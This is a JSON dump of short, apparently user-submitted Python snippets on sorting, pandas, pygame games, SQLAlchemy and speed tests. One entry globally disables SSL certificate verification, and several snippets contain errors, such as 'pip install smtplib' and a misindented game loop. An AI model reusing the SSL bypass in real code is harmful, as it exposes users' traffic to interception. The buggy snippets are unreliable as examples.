    "description": "import time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Printed after 2.4 seconds.\")\nimport time  print(\"Print now\") time.sleep(4.2) print(\"Printing after 4.2 seconds\")\n",
    "reg_date": "2021-10-12T11:35:02.000Z"
  },
  {
    "id": 4373,
    "keyword": null,
    "link": null,
    "title": " sleep py",
    "description": "import time  print(\"Printed immediately.\") time.sleep(2.4) print(\"Printed after 2.4 seconds.\")\nimport time  print(\"Print now\") time.sleep(4.2) print(\"Printing after 4.2 seconds\")\nimport time #stops the program for x seconds time.sleep(x)\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4374,
    "keyword": null,
    "link": null,
    "title": " slice dataframe dwpwnding on column value not emty",
    "description": "df = df[df['EPS'].notna()]\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4375,
    "keyword": null,
    "link": null,
    "title": " slugify python",
    "description": "# shell/bash pip install python-slugify # or  pip3 install python-slugify  # python from slugify import slugify\nfrom django.template.defaultfilters import slugify  # in the view maybe while saving the form... def savedata()     form = someform(request.POST or None)   \tif form.is_valid():         new_post = form.save(commit=False) #for holding it before actually saving         # slugify returns elephant-is-big if passed slugify(\"elephant is big\")         # and therefore a hyphened slug         new_post.slug = slugify(form.title)          new_post.save()  # model may look like this class SomeModel(models.Model):     title = models.Charfield()     slug = models.SlugField(unique=True)     ## other fields\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4376,
    "keyword": null,
    "link": null,
    "title": " smtplib python install",
    "description": "pip install smtplib\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4377,
    "keyword": null,
    "link": null,
    "title": " snake python",
    "description": "import pygame import numpy import random import math pygame.init() clock = pygame.time.Clock() screen = pygame.display.set_mode((377, 377)) grid = numpy.zeros((15, 15), dtype=\"int8\") for i in range(4):     grid[7][2+i] = 2 apple_pos = [7, 11] grid[apple_pos[0]][apple_pos[1]] = 5 snake = [[7, 2], [7, 5]] d = [2, 2] direction_list = [] keys = [pygame.K_UP, pygame.K_RIGHT, pygame.K_DOWN, pygame.K_LEFT] colors = [(0, 150, 150), (0, 255, 0), (255, 0, 0)] frames = 0 moving = False while True:     frames += 1     for event in pygame.event.get():         if event.type == pygame.QUIT:             quit()         if event.type == pygame.KEYDOWN:             for i in range(len(keys)):                 if event.key == keys[i]:                     moving = True                     direction_list.append(i+1)     if moving and frames >= 10:         frames = 0         if len(direction_list) > 0:             d[1] = direction_list[0]             direction_list.pop(0)         d[0] = grid[snake[0][0]][snake[0][1]]         last_pos = [snake[0][:], snake[1][:]]         for i in range(2):             snake[i][round((d[i] % 2-1)*-1)] += round(5/24*d[i]**4 - 25/12*d[i]**3 + 151/24*d[i]**2 - 65/12*d[i])             grid[last_pos[i][0]][last_pos[i][1]] = d[i] * i             if i:                 for n in range(2):                     if snake[i][n] < 0 or snake[i][n] > 14:                         quit()                 if 5 > grid[snake[i][0]][snake[i][1]] > 0:                     quit()                 if snake[i] == apple_pos:                     grid[last_pos[0][0]][last_pos[0][1]] = d[0]                     snake[0] = last_pos[0]                     while grid[apple_pos[0]][apple_pos[1]] != 0:                         apple_pos = [random.randint(0, 14), random.randint(0, 14)]                     grid[apple_pos[0]][apple_pos[1]] = 5                 grid[snake[i][0]][snake[i][1]] = d[1]     for row in range(len(grid)):         for pos in range(len(grid[row])):             pygame.draw.rect(screen, colors[round((math.log(grid[row][pos]+1))-0.15)], (25*pos + 2, 25*row + 2, 23, 23))     clock.tick(60)     pygame.display.update() \nwrong python my guy\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4378,
    "keyword": null,
    "link": null,
    "title": " snowflake python connector error handling",
    "description": "import os import snowflake.connector from snowflake.connector.errors import DatabaseError, ProgrammingError  snowflake_account = os.environ['SNOWFLAKE_ACCOUNT']  if __name__ == '__main__':     try:         con = snowflake.connector.connect(             user='bad username',       # <-------- Bad user             password='bad password',   # <-------- Bad pass             account=snowflake_account  # <-------- This is correct         )     except DatabaseError as db_ex:         if db_ex.errno == 250001:             print(f\"Invalid username/password, please re-enter username and password...\")             # code for user to re-enter username & pass         else:             raise     except Exception as ex:         # Log this         print(f\"Some error you don't know how to handle {ex}\")         raise     else:         try:             results = con.cursor().execute(\"select * from db.schema.table\").fetchall()             print(results)         except ProgrammingError as db_ex:             print(f\"Programming error: {db_ex}\")             raise         finally:             con.close()  \n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4379,
    "keyword": null,
    "link": null,
    "title": " sns figsize",
    "description": "from matplotlib import pyplot as plt import seaborn as sns  plt.figure(figsize=(15,8)) ax = sns.barplot(x=\"Word\", y=\"Frequency\", data=boxdata) \n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4380,
    "keyword": null,
    "link": null,
    "title": " sns set figure size",
    "description": "import seaborn as sns  sns.set(rc={'figure.figsize':(11.7,8.27)})\nfrom matplotlib import pyplot as plt import seaborn as sns  plt.figure(figsize=(15,8)) ax = sns.barplot(x=\"Word\", y=\"Frequency\", data=boxdata) \n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4381,
    "keyword": null,
    "link": null,
    "title": " sns title",
    "description": "sns.boxplot('Day', 'Count', data= gg).set_title('lalala')\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4382,
    "keyword": null,
    "link": null,
    "title": " somma in python",
    "description": ">>> 2 + 2 4\n",
    "reg_date": "2021-10-12T11:35:03.000Z"
  },
  {
    "id": 4383,
    "keyword": null,
    "link": null,
    "title": " sort a dataframe by a column valuepython",
    "description": ">>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4384,
    "keyword": null,
    "link": null,
    "title": " sort a list by values of another one python",
    "description": "numbers = [1, 2, 3] letters = ['c', 'a', 'b']  #The numbers array sorted by the letters order sorted_list = [number for letter, number in sorted(zip(letters, numbers))]  print(sorted_list) #prints: [2, 3, 1]\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4385,
    "keyword": null,
    "link": null,
    "title": " sort by index 2d array python",
    "description": "a = [[9, 9, 2], [9, 9, 3], [9, 9, 8], [9, 9, 4], [9, 9, 1], [9, 9, 5]]  b = sorted(a, key=lambda a:a[2])  #b contains the following arrays, sorted by their second index: [[9, 9, 1], [9, 9, 2], [9, 9, 3], [9, 9, 4], [9, 9, 5], [9, 9, 8]]\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4386,
    "keyword": null,
    "link": null,
    "title": " sort by index pandas",
    "description": ">>> df = pd.DataFrame([1, 2, 3, 4, 5], index=[100, 29, 234, 1, 150], ...                   columns=['A']) >>> df.sort_index()      A 1    4 29   2 100  1 150  5 234  3 \npd.sort_index()\ndf.sort_index()\nimport pandas as pd import numpy as np  unsorted_df = pd.DataFrame(np.random.randn(10,2),index=[1,4,6,2,3,5,9,8,0,7],colu    mns = ['col2','col1'])  sorted_df=unsorted_df.sort_index() print sorted_df\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4387,
    "keyword": null,
    "link": null,
    "title": " sort by two columns in pandas",
    "description": "df.sort_values(['a', 'b'], ascending=[True, False])\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4388,
    "keyword": null,
    "link": null,
    "title": " sort dataframe by column",
    "description": "df.sort_values(by='col1', ascending=False)\n#Python, Pandas #Sorting dataframe df on the values of a column col1 #Temporary df.sort_values(by=[\"col1\"])   #Permanent df.sort_values(by=[\"col1\"], inplace = True)\n>>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \ndf = df.reindex(sorted(df.columns), axis=1) \nDataFrame.sort_values(self, by, axis=0, ascending=True,                       inplace=False, kind='quicksort',                       na_position='last',                       ignore_index=False)  # Example df.sort_values(by=['ColToSortBy'])\ndf.sort_values(by='col1', ascending=False, na_position='first', inplace=True)\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4389,
    "keyword": null,
    "link": null,
    "title": " sort dictinary values from descending",
    "description": "Python Code: import operator d = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} print('Original dictionary : ',d) sorted_d = dict(sorted(d.items(), key=operator.itemgetter(1))) print('Dictionary in ascending order by value : ',sorted_d) sorted_d = dict(sorted(d.items(), key=operator.itemgetter(1),reverse=True)) print('Dictionary in descending order by value : ',sorted_d)  Sample Output: Original dictionary :  {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} Dictionary in ascending order by value :  {0: 0, 2: 1, 1: 2, 4: 3, 3: 4} Dictionary in descending order by value :  {3: 4, 4: 3, 1: 2, 2: 1, 0: 0}\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4390,
    "keyword": null,
    "link": null,
    "title": " sort list of dictionaries by key python",
    "description": "newlist = sorted(list_to_be_sorted, key=lambda k: k['name']) \n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4391,
    "keyword": null,
    "link": null,
    "title": " sort list of dictionaries python",
    "description": "newlist = sorted(list_to_be_sorted, key=lambda k: k['name']) \nunsorted_list = [{\"key1\":5, \"key2\":2}, {\"key1\":5, \"key2\":1}] sorted_list = sorted(unsorted_list, key=lambda k: k[\"key2\"])\nd = {2: 3, 1: 89, 4: 5, 3: 0} od = sorted(d.items()) print(od)\nx = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} {k: v for k, v in sorted(x.items(), key=lambda item: item[1])} {0: 0, 2: 1, 1: 2, 4: 3, 3: 4}\norders = { \t'cappuccino': 54, \t'latte': 56, \t'espresso': 72, \t'americano': 48, \t'cortado': 41 }  sort_orders = sorted(orders.items(), key=lambda x: x[1], reverse=True)  for i in sort_orders: \tprint(i[0], i[1])\n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4392,
    "keyword": null,
    "link": null,
    "title": " sort list of dictionaries python by value",
    "description": "newlist = sorted(list_to_be_sorted, key=lambda k: k['name']) \nimport operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(1))   # Sort by key import operator x = {1: 2, 3: 4, 4: 3, 2: 1, 0: 0} sorted_x = sorted(x.items(), key=operator.itemgetter(0)) \n",
    "reg_date": "2021-10-12T11:35:04.000Z"
  },
  {
    "id": 4393,
    "keyword": null,
    "link": null,
    "title": " sort list of numbers python",
    "description": "nums = [48, 35, 32, 5, 5, 16, 5, 16, 28, 29] # Makes a list of numbers  sortedNums = sorted(nums, key=int) # Sorts the numbers and saves it as a variable print(sortedNums) # Prints the variable\n>>> numbers = [6, 9, 3, 1] >>> numbers_sorted = sorted(numbers) >>> numbers_sorted [1, 3, 6, 9] >>> numbers [6, 9, 3, 1] \nmy_list = [1,\"hello world\", 16.2] len(my_list) 3\nnumbers = [1, 5, -2, 4] numbers.sort() print(numbers)\nprint([i for i in range(2, int(input(\"Enter your number: \"))+1) if 0 not in [i%n for n in range(2, i)]])\nList_name.sort() This will sort the given list in ascending order.\n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4394,
    "keyword": null,
    "link": null,
    "title": " sort one column ascending and another column descending in python alphabetically",
    "description": "df = df.sort_values([\"b\", \"c\"], ascending = (False, True))\nsort_na_first = gapminder.sort_values('lifeExp',na_position='first') \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4395,
    "keyword": null,
    "link": null,
    "title": " sort tuple by first element python",
    "description": "a = [(5,8), (3,4), (9,7)]  #sort by first element in tuple result = sorted(a, key=lambda tup: tup[0])  #OR to do inplace sort:  a.sorted(key = lambda tup: tup[0])  # output [(3, 4), (5, 8), (9, 7)] \n# lists_of_tuples = [('item', 'price'), ('item', 'price'), ('item', 'price')] def sort_prices(list_of_tuples): #sort the list b*y the price of each tuple     list_of_tuples.sort(key=lambda x: x[1], reverse=True) #earse the \"reverse\" part to sort in small to big.     return list_of_tuples, print(list_of_tuples)\n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4396,
    "keyword": null,
    "link": null,
    "title": " sort two lists by one python",
    "description": "list1 = [3,2,4,1,1] list2 = ['three', 'two', 'four', 'one', 'one2'] list1, list2 = zip(*sorted(zip(list1, list2)))\n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4397,
    "keyword": null,
    "link": null,
    "title": " sort values",
    "description": "df.sort_values(by='col1', ascending=False)\n>>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4398,
    "keyword": null,
    "link": null,
    "title": " sorting by column in pandas",
    "description": "#Python, Pandas #Sorting dataframe df on the values of a column col1 #Temporary df.sort_values(by=[\"col1\"])   #Permanent df.sort_values(by=[\"col1\"], inplace = True)\n>>> df.sort_values(by=['col1'])     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n>>> df.sort_values(by=['col1'], ascending = False)     col1 col2 col3 0   A    2    0 1   A    1    1 2   B    9    9 5   C    4    3 4   D    7    2 3   NaN  8    4 \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4399,
    "keyword": null,
    "link": null,
    "title": " sorting rows and columns in pandas",
    "description": "df.sort_values(by=\"ColumnName\", axis=0, ascending=False, inplace=False, kind='quicksort') #axis 0 is rows and axis 1 is columns. For axis 0 by needs to contain column name  \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4400,
    "keyword": null,
    "link": null,
    "title": " space shooter game in python",
    "description": "# importing pygame import pygame import random # importing math import math # importing mixer from pygame import mixer import android mixer.init() r = 'ready' b = 2 space = 0 x = 50 y = 515 start = 10 width = 40 height = 5 # Asteroid Asteroid1 = [] Asteroid_x = [] Asteroid_y = [] Asteroid_x_change = [] Asteroid_y_change = [] for i in range(30):     Asteroid1.append(pygame.image.load(\"alien.png\"))     Asteroid_x.append(random.randint(0, 800))     Asteroid_y.append(random.randint(50, 150))     Asteroid_x_change.append(3.8)     Asteroid_y_change.append(6) pygame.init() # Changing the icon of the screen icon = pygame.image.load('ufo.png') pygame.display.set_icon(icon) # Creating the screen screen = pygame.display.set_mode((800, 600)) # background pic background = pygame.image.load('space.jpg') pygame.display.set_caption(\"Space shooter\") # Colour BLUE = (100, 100, 255) RED = (255, 0, 0) LIME = (180, 255, 100) '''Asteroid''' # Player player = pygame.image.load(\"player.png\") player_x = 370 player_y = 480 # Bullet Bullet = pygame.image.load(\"Bullet.png\") Bullet_x = 370 Bullet_y = 480 Bullet_x_change = 9 Bullet_y_change = 60 Bullet_state = r # score score_value = 0 font = pygame.font.Font('freesansbold.ttf', 25) text_x = 200 text_y = 10       # Creating score function def score(X, Y):     scores = font.render('Score : {}'.format(score_value), True, BLUE)     screen.blit(scores, (X, Y))   # Creating fire function def fire(x, y):     global Bullet_state     Bullet_state = fire     screen.blit(Bullet, (x + 18, y + 10))   # Creating fire function def play(X, Y):     screen.blit(player, (X, Y))   # Creating  Asteroid function def asteroid_function(X, Y, i):     screen.blit(Asteroid1[i], (X, Y))   # Creating background function def background_function():     screen.blit(background, (0, 0))   # While loop run = True while run:     # calling the background function     background_function()     for event in pygame.event.get():         if event.type == pygame.QUIT:             run = False     keys = pygame.key.get_pressed()     # player movement     if keys[pygame.K_LEFT]:         player_x -= 3     if keys[pygame.K_RIGHT]:         player_x += 3     # Bullet shooting         laser_sound = mixer.Sound(\"C:\\\\laser.wav\")         laser_sound.play()         Bullet_x = player_x         fire(Bullet_x, Bullet_y)         fire(Bullet_x, Bullet_y)         Bullet_y -= Bullet_y_change     if Bullet_y <= 0:         Bullet_y = 480         Bullet_state = r         # collision     if score_value == 300:         print('you win')         run = False       def collision(Bullet_x, Bullet_y, Asteroid_x, Asteroid_y):         distance = math.sqrt(math.pow(Asteroid_x - Bullet_x, 2) + math.pow(Asteroid_y - Bullet_y, 2))         if distance < 27:             return True         else:             return False         # collision     # boundaries     if player_x <= 0:         player_x = 0     elif player_x >= 736:         player_x = 736     # boundaries enemy     for i in range(30):         Asteroid_x[i] += Asteroid_x_change[i]         if Asteroid_x[i] <= 0:             Asteroid_x_change[i] = 3.8             Asteroid_y[i] += Asteroid_y_change[i]         elif Asteroid_x[i] >= 736:             Asteroid_x_change[i] = -3.8             Asteroid_y[i] += Asteroid_y_change[i]         collisions = collision(Asteroid_x[i], Asteroid_y[i], Bullet_x, Bullet_y)         if collisions:             Bullet_y = 480             Bullet_state = 'ready'             score_value = score_value +  1             laser_sound = mixer.Sound(\"C:\\\\explosion.wav\")             laser_sound.play()             Asteroid_x.append(random.randint(0, 800))             Asteroid_y.append(random.randint(50, 150))         # calling the asteroid function         asteroid_function(Asteroid_x[i], Asteroid_y[i], i)     if event.type == pygame.KEYDOWN:         # quitting the game         if event.key == ord('q'):             pygame.quit()         # changing the spaceship         if event.key == ord('s'):             b = b + 1             if b == 1:                 player = pygame.image.load(\"player.png\")             if b == 2:                 player = pygame.image.load(\"l.png\")             if b == 3:                 player = pygame.image.load('player2.png')             if b == 4:                 b = 1     # calling the player function     play(player_x, player_y)     # calling the score function     score(text_x, text_y)     # Refresh Screen     pygame.display.flip()  \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4401,
    "keyword": null,
    "link": null,
    "title": " space to underscore python",
    "description": "mystring.replace(\" \", \"_\") \n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4402,
    "keyword": null,
    "link": null,
    "title": " spacy  frenc hlemmatizer",
    "description": ">>> from nltk.stem.snowball import FrenchStemmer >>> stemmer = FrenchStemmer() >>> stemmer.stem('voudrais') u'voudr' >>> stemmer.stem('animaux') u'animal' >>> stemmer.stem('yeux') u'yeux' >>> stemmer.stem('dors') u'dor' >>> stemmer.stem('couvre') u'couvr'\npip3 install spacy python3 -m spacy download fr_core_news_md  import spacy nlp = spacy.load('fr_core_news_md')  doc = nlp(u\"voudrais non animaux yeux dors couvre.\") for token in doc:     print(token, token.lemma_)\n",
    "reg_date": "2021-10-12T11:35:05.000Z"
  },
  {
    "id": 4403,
    "keyword": null,
    "link": null,
    "title": " spark df shape",
    "description": "print((df.count(), len(df.columns)))\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4404,
    "keyword": null,
    "link": null,
    "title": " special characters list in python",
    "description": "#this is the speical char list symbols = {'~', ':', \"'\", '+', '[', '\\\\', '@', '^', '{', '%', '(', '-', '\"', '*', '|', ',', '&', '<', '`', '}', '.', '_', '=', ']', '!', '>', ';', '?', '#', '$', ')', '/'} print(symbols)\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4405,
    "keyword": null,
    "link": null,
    "title": " speedtest-cli python example",
    "description": "#pip3 install speedtest-cli import speedtest  #function that gets the download speed in mega bytes per second def get_final_speed():     rawspeed = speedtest.Speedtest().download()     roundedspeed = round(rawspeed)     finalspeed = roundedspeed / 1e+6     return finalspeed  #function that finds the average downloadspeed in mega bytes a second def looped_av(y):     finalspeeds = 0     for i in range(y):         x = get_final_speed()         speeds = 0         count = 0         count += 1         speeds += x         print(f'{i+1}. {x}mb/s')           #menu loop while True:     repeat = input('1, 2, 3 or press {ENTER} to quit\\n>>>')     if repeat == '1':         #single iteration         x = get_final_speed()         print(f'done, your download speed is {x}mb/s')     elif repeat == '2':         #2 iterations and finds the average speed         x = looped_av(2)         print(f'done, your average download speed is {x}mb/s')     elif repeat == '3':         #finds out how accurate the user wants the average to be, pretty pointless i know         times_through = int(input('how many times do you want the test to run?\\n>>>'))         #iterates and finds the average download speed         x = looped_av(times_through)      else:         #breaks from the loop         break\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4406,
    "keyword": null,
    "link": null,
    "title": " speedtest py",
    "description": "#pip3 install speedtest-cli import speedtest  #function that gets the download speed in mega bytes per second def get_final_speed():     rawspeed = speedtest.Speedtest().download()     roundedspeed = round(rawspeed)     finalspeed = roundedspeed / 1e+6     return finalspeed  #function that finds the average downloadspeed in mega bytes a second def looped_av(y):     finalspeeds = 0     for i in range(y):         x = get_final_speed()         speeds = 0         count = 0         count += 1         speeds += x         print(f'{i+1}. {x}mb/s')         finalspeeds = speeds/count     return finalspeeds  #menu loop while True:     repeat = input('1, 2, 3 or press {ENTER} to quit\\n>>>')     if repeat == '1':         #single iteration         x = get_final_speed()         print(f'done, your download speed is {x}mb/s')     elif repeat == '2':         #2 iterations and finds the average speed         x = looped_av(2)         print(f'done, your average download speed is {x}mb/s')     elif repeat == '3':         #finds out how accurate the user wants the average to be, pretty pointless i know         times_through = int(input('how many times do you want the test to run?\\n>>>'))         #iterates and finds the average download speed         x = looped_av(times_through)         print(f'done, your average download speed is {x}mb/s')       else:         #breaks from the loop         break\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4407,
    "keyword": null,
    "link": null,
    "title": " spike python",
    "description": "pip install spike-py pip install -U spike-py pip install ipympl\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4408,
    "keyword": null,
    "link": null,
    "title": " split a string by comma python",
    "description": "# We can use the split() function and put a \",\" in the parameter  # It'll return a list with the string split up by commas. txt = \"hello, my name is Peter, I am 26 years old\"  x = txt.split(\",\") print(x)  # You can also do this for thing in x:   print(thing)\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4409,
    "keyword": null,
    "link": null,
    "title": " split a text file into multiple paragraphs python",
    "description": "txt = \"welcome to the jungle\"  x = txt.split(\"\\n\")  print(x)\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4410,
    "keyword": null,
    "link": null,
    "title": " split array into chunks python",
    "description": "a = [1, 2, 3, 4, 5, 6 ,7 ,8 ,9]  splitedSize = 3 a_splited = [a[x:x+splitedSize] for x in range(0, len(a), splitedSize)]  print(a_splited) # [[1, 2, 3], [4, 5, 6], [7, 8, 9]]\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4411,
    "keyword": null,
    "link": null,
    "title": " split filename and extension python",
    "description": "import os.path extension = os.path.splitext(filename)[1]\n>>> import os >>> filename, file_extension = os.path.splitext('/path/to/somefile.ext') >>> filename '/path/to/somefile' >>> file_extension '.ext'\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4412,
    "keyword": null,
    "link": null,
    "title": " split imagedatagenerator into x train and y train",
    "description": "in python 2:  X_train, y_train = train_generator.next() X_test, y_test = validation_generator.next()  in python 3:  X_train, y_train = next(train_generator) X_test, y_test = next(validation_generator)\ntrain_datagen = ImageDataGenerator(rescale=1./255,     shear_range=0.2,     zoom_range=0.2,     horizontal_flip=True,     validation_split=0.2) # set validation split  train_generator = train_datagen.flow_from_directory(     train_data_dir,     target_size=(img_height, img_width),     batch_size=batch_size,     class_mode='binary',     subset='training') # set as training data  validation_generator = train_datagen.flow_from_directory(     train_data_dir, # same directory as training data     target_size=(img_height, img_width),     batch_size=batch_size,     class_mode='binary',     subset='validation') # set as validation data\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4413,
    "keyword": null,
    "link": null,
    "title": " split list into list of lists python on every n element",
    "description": "big_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16] x = 4 list_of_lists = [big_list[i:i+x] for i in range(0, len(big_list), x)] # [[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12], [13, 14, 15, 16]]\n",
    "reg_date": "2021-10-12T11:35:06.000Z"
  },
  {
    "id": 4414,
    "keyword": null,
    "link": null,
    "title": " split python file into different data types",
    "description": "##Write a Python program to create a file of elements of any data type (mixed data type, i.e. some  elements maybe of type int, some elements of type float and some elements of type string). Split  this file into three file containing elements of same data type (i.e. 1st file of integers only, 2nd file of float only and 3rd file of strings only). Take input from the user to create the file.   f = open('MixedFile.txt','w') while True :     user = input(\"Enter Any Data Type Element :: \")     if user == 'end':         print('!!!!!!!! EXIT !!!!!!!!!!!!')         break     else :         f.write(user + '\\n') f.close() f = open('MixedFile.txt') a = [] a = f.read().split() f.close() fs = open ('StringFile.txt','w') ff = open ('FloatFile.txt','w') fn = open ('NumberFile.txt','w') for i in a :     try:         int(i)         fn.write(i + '\\n')     except:             try:                 float(i)                 ff.write(i + '\\n')             except:                 fs.write(i + '\\n') f.close() fs.close() fn.close() ff.close()  print(\"reading................\") fs = open ('StringFile.txt','r') ff = open ('FloatFile.txt','r') fn = open ('NumberFile.txt','r') print(fs.read()) print(fn.read()) print(ff.read()) \n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4415,
    "keyword": null,
    "link": null,
    "title": " split string form url last slash",
    "description": "url = 'http://www.test.com/TEST1' l = url.split('/', -1)[-1]\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4416,
    "keyword": null,
    "link": null,
    "title": " split string in the middle python",
    "description": "firstpart, secondpart = string[:len(string)/2], string[len(string)/2:]\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4417,
    "keyword": null,
    "link": null,
    "title": " split string into array every n characters python",
    "description": "string = '1234567890' n = 2\t# every 2 characters split_string = [string[i:i+n] for i in range(0, len(string), n)] # split_string = ['12', '34', '56', '78', '90']\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4418,
    "keyword": null,
    "link": null,
    "title": " spress warnings selenium python",
    "description": "options = webdriver.ChromeOptions() options.add_experimental_option('excludeSwitches', ['enable-logging']) driver = webdriver.Chrome(executable_path='<path-to-chrome>', options=options) \n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4419,
    "keyword": null,
    "link": null,
    "title": " sql alchemy engine all tables",
    "description": "engine.table_names()\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4420,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy check if database exists",
    "description": "# pip install sqlalchemy-utils  from sqlalchemy_utils.functions import database_exists  if database_exists(app.config[\"SQLALCHEMY_DATABASE_URI\"]):     # do stuff\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4421,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy lock row",
    "description": "YourModel.query.with_for_update().get(id)  #This locks the row until  db.session.rollback() #or db.session.commit() #is called\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4422,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy python install",
    "description": "pip install SQLAlchemy\npip install -U Flask-SQLAlchemy\n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4423,
    "keyword": null,
    "link": null,
    "title": " sqlalchemy query bilter by current month",
    "description": "from sqlalchemy import extract    session.query(Event).filter(extract('year', Event.date)==2018).filter(extract('month', Event.date)==7).all() \n",
    "reg_date": "2021-10-12T11:35:07.000Z"
  },
  {
    "id": 4424,
    "keyword": null,
    "link": null,
    "title": " sqlite to pandas",
    "description": "import sqlite3 import pandas as pd  dat = sqlite3.connect('data.db') query = dat.execute(\"SELECT * From <TABLENAME>\") cols = [column[0] for column in query.description] results= pd.DataFrame.from_records(data = query.fetchall(), columns = cols)\nimport pandas as pd import sqlite3  con = sqlite3.connect('/Users/mac/Desktop/Python/Baye_stat/productiondisruption/PCI_meat.sqlite')  df = pd.read_sql(<your query here>, con) \n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4425,
    "keyword": null,
    "link": null,
    "title": " sqrt python",
    "description": "import math  math.sqrt( x )\n#Run this code in the shell - do not run this as a .py file. >>> import math #On a different line type the following: >>> math.sqrt(YourNumberHere) #You may replace YourNumberHere with any number.\nimport math a = input(\"what do you wnat to square root\") print(math.sqrt(a))\nimport math  toSquare = 300 squared = math.sqrt(toSquare) \nimport math print(math.sqrt(589485))\ndef square_root(num):   \treturn num**0.5 #prints out 4 print(square_root(16)) #prints out 10 print(square_root(100))\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4426,
    "keyword": null,
    "link": null,
    "title": " squered python",
    "description": "# Use the exponentiation operator 3 ** 2 \t\t# 9 10 ** 2 \t# 100 5 ** 2 \t\t# 25\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4427,
    "keyword": null,
    "link": null,
    "title": " src/ portaudiomodule.c:29:10: fatal error: 'portaudio.h' file not found",
    "description": "brew install portaudio\npip install --global-option='build_ext' --global-option='-I/usr/local/include' --global-option='-L/usr/local/lib' pyaudio\n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4428,
    "keyword": null,
    "link": null,
    "title": " ssl unverified certificate python",
    "description": "import ssl   # creates an unverified certificate with ssl even without certificate try:     _create_unverified_https_context = ssl._create_unverified_context except AttributeError:     pass else:     ssl._create_default_https_context = _create_unverified_https_context  #upvote this if it helped you \n",
    "reg_date": "2021-10-12T11:35:08.000Z"
  },
  {
    "id": 4429,
    "keyword": null,
    "link": null,
    "title": " stackoverflow searcher python",
